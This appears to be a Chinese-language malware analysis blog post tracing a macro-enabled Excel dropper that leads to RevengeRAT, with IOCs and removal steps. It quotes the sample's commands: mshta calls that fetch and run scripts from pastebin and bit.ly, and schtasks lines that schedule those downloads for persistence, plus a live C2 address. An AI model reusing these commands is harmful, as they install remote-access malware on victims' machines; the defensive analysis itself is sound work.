---
title: Lunlayloo 木马
date: 2019-09-06 19:11:22
index_img: https://dc.snscz.com/s2/img/original/2019/04/01/14/14004_b10b643428.jpg
banner_img: https://dc.snscz.com/s2/img/original/2019/04/01/14/14004_b10b643428.jpg
tags:
    - Rat H-worm
categories: 样本详细分析
---


## 基本信息
|FileName| FileType|MD5|Size|
|--|--|--|--|
| Order____679873892.xls| rat  |7641FEF8ABC7CB24B66655D11EF3DAF2|41472 bytes|


## 简介
该样本语言类型为 VBS和JS编写，中间过程完全使用无文件格式，内容也都能随时在线更改，在一定程序上能躲避安全软件的查杀，通过不同混淆更容易达到免杀的效果。

## 流程图
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920124614242.png)

## 详细分析

文件有宏，且宏有密码，可以使用`offkey`直接更改宏密码
进入宏代码后在`shell(fun)`处下断，可以拿到shell 的连接地址
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190916212336956.png) `mshta http://bit.ly/8hsshjahassahsh`

打开这个页面看似是一个正常页面，但仔细查找是能在源码中找到恶意js代码的
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190917141638561.png)
拿出来使用`console`打印出来
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190917141856253.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190917143320931.png)
处理后执行了`WScript.Shell.Run mshta http://www.pastebin.com/raw/nv5d9pYu,vbHide`
看看究竟是什么东西
木马作者选择了一个匿名代码存放地址网站，来逃避追踪。
但是目前这个RWA地址页面已经被删除了
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190917143741625.png)
这个样本在any.run上有人运行过，有记录，所以可以找到这个访问记录。
https://app.any.run/tasks/0100486e-1711-4af6-a437-74ad27216f36/
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190917144032656.png)
拿出这个代码
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190917144558325.png)
下面看看怎么玩的，关闭打开的excel word ppt msp软件，让中马的人以为想不到是宏的原因，给人 眼部见为净 的感觉

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190917151722331.png)

接着又安装两个计划任务，来持久化攻击和进一步执行操作

`schtasks /create /sc MINUTE /mo 60 /tn Windows Update /tr mshta.exe http://pastebin.com/raw/vXpe74L2 /F`![在这里插入图片描述](https://img-blog.csdnimg.cn/20190917154541622.png)
`schtasks /create /sc MINUTE /mo 300 /tn Update /tr mshta.exe http://pastebin.com/raw/JdTuFmc5 /F`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190917154555627.png)
通过schtasks  创建两个计划任务来执行两个脚本文件
还加入了一个开启自启动
![在这里插入图片描述](https://img-blog.csdnimg.cn/2019091715561730.png)

接下来看看这三个脚本是怎么操作的

`JdTuFmc5` 又是一系列加密，下面是解密后的结果

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919105945345.png)
尝试去下载并执行两个.net编写的可执行程序，暂时命名为`bit1.bin`和`2bit1.bin`后面分析

在`wMG90xwi`这个raw中定义了一个`$a`对象，这个对象是将上面的bit1.bin读入内存的对象，可以直接使用
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919105430408.png)
使用dnspy打开反编译这个dll

里面就有`THC452563sdfdsdfgr4777cxg04477fsdf810df777`类和它的方法`retrt477fdg145fd4g0wewerwedsa799221dsad4154qwe(string FTONJ, byte[] coco)` 

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190919110436546.png)
然后使用`Invoke`去调用了这个方法，且传入的参数是('MSBuild.exe',$f)

查一下壳，发现是加了`Confuser`的混淆

解完混淆之后再看
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920183121543.png)
会按照顺序去检测文件`MSBuild.exe`存在在哪，然后调用`ticklens`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920183342286.png)
`PEHeaderE`函数是在修改程序自身代码
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920184816602.png)主要看`FUN`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920184846835.png)
发现是在循环调用`smethod_0`方法，这个方法就是真正的创建傀儡进程

`lpname` 指向要打开的进程

`lpBuf` 是要注入的数据

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920185315420.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/2019092018553021.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920185552483.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920185722874.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920185657512.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920185749272.png)
上面就是典型的进程注入  作用是将第二个可执行程序注入到`MSBuild.exe`中

这里就直接看一下 这个注入的程序到底是什么

反编译下一个2bit2.bin

根据关键字搜索，可以发现这是`RevengeRAT `远控生成的客户端
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190920111854823.png)
这个远控是一个有免费版本，网络上也有泄露的版本，因为是.net编写，基本功能也都能识别出来

首先是C2地址 `meandmyjoggar.duckdns.org:777`

程序互斥体名 `RV_MUTEX-WindowsUpdateSysten32`

两个计划任务和加入的启动项注册表都是一样的程序，这里就不累述了

**总的来说就是将远控代码注入到一个正常的程序中，来达到执行且躲避安全软件**



## IOC
| 域名| 类型 |
|--|--|
|http://www.pastebin.com/raw/nv5d9pYu| C&C|
|http://pastebin.com/raw/vXpe74L2| C&C|
|http://pastebin.com/raw/JdTuFmc5| C&C|
|http://pastebin.com/raw/CGe3S2Vf| C&C|
|https://pastebin.com/raw/wMG90xwi| C&C|
|https://pastebin.com/raw/W455MkAZ| C&C|
|meandmyjoggar.duckdns.org:777 | C&C|


## 查杀方案
关闭`MSBuild.exe`进程
删除计划任务名为`Windows Update`和`Update`的任务
删除`HKCU\Software\Microsoft\Windows\CurrentVersion\Run\AvastUpdate`表项
删除`Order____679873892.xls`

## 总结
感染链复杂，控制解密繁琐，多方面控制持久化操作，无文件攻击，技术含量高。个人以及企业中需要时刻面对各种威胁，要时刻保持警惕，防患于未然。
